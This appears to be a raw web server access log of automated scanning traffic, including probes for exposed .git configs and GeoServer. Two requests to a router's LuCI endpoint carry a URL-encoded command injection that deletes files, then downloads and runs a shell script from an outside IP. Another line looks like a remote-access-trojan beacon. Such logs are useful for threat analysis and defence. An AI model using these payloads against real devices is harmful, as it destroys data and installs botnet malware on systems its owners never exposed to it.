64.62.197.40 - - [16/Feb/2024:09:53:18 +0000] "GET /geoserver/web/ HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
64.62.197.39 - - [16/Feb/2024:09:54:48 +0000] "GET /.git/config HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.55 - - [16/Feb/2024:10:07:27 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
181.214.166.113 - - [16/Feb/2024:10:08:36 +0000] ":\x92T\x05ib\xE8\x0Ek_V\x08\xDD=x\xAB\xC2\x13\x22\xB88\x1B\x01\x07\xA6\xB1~\xE0Ap\x8D\x96\xF3 \xB9\xDB\x0CEN#5h[\xE4\xC5\x16\xF7wBr=\xB1" 400 150 "-" "-"
167.94.138.33 - - [16/Feb/2024:10:11:36 +0000] "GET / HTTP/1.1" 404 207 "-" "-"
167.94.138.33 - - [16/Feb/2024:10:11:40 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.33 - - [16/Feb/2024:10:11:41 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
45.79.163.53 - - [16/Feb/2024:10:12:38 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 zgrab/0.x"
188.166.87.67 - - [16/Feb/2024:10:23:59 +0000] "GET / HTTP/1.1" 403 180 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
188.166.87.67 - - [16/Feb/2024:10:24:00 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 150 "-" "-"
205.210.31.17 - - [16/Feb/2024:10:26:10 +0000] "GET / HTTP/1.1" 403 146 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [16/Feb/2024:10:29:46 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.180.143.79 - - [16/Feb/2024:10:51:42 +0000] "GET / HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
18.197.206.113 - - [16/Feb/2024:10:58:33 +0000] "GET /.git/config HTTP/1.1" 404 184 "-" "Mozilla/5.0 (Linux; Android 9; CPH1859) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
18.197.206.113 - - [16/Feb/2024:11:00:03 +0000] "GET /.git/config HTTP/1.1" 404 184 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/74.0.3729.121 Mobile/15E148 Safari/605.1"
185.224.128.10 - - [16/Feb/2024:11:01:37 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.142.214.108%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
185.224.128.10 - - [16/Feb/2024:11:01:37 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F45.142.214.108%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh) HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
91.92.244.120 - - [16/Feb/2024:11:04:27 +0000] "" 400 0 "-" "-"
172.105.128.12 - - [16/Feb/2024:11:06:44 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03r\x9Am|\x93\x91\x87uJ\x86\xCDo\x93\x1A\xBE\x09JV\x16O\xB1\xFB\xDE\x10\xB2^N\xC5\xF6<\x1C\xAA\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
103.224.35.184 - - [16/Feb/2024:11:15:11 +0000] "GET / HTTP/1.1" 200 1934 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
143.110.222.166 - - [16/Feb/2024:11:23:26 +0000] "GET / HTTP/1.1" 403 118 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
